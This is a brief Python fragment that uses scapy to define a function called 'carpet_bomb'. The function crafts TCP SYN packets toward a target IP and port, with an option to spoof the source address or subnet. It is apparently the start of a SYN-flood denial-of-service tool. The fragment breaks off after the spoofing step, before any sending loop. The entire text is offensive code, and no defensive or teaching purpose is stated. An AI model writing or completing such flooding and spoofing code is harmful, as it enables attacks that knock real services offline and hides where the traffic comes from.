from scapy.all import *

def carpet_bomb(dest_ip: str, dest_port: int=80, src_ip: str=None, src_subnet: int=None):
    syn = IP(dst=dest_ip)/TCP(dport=dest_port, flags="S")
    if src_ip is not None:
        syn.src = src_ip
    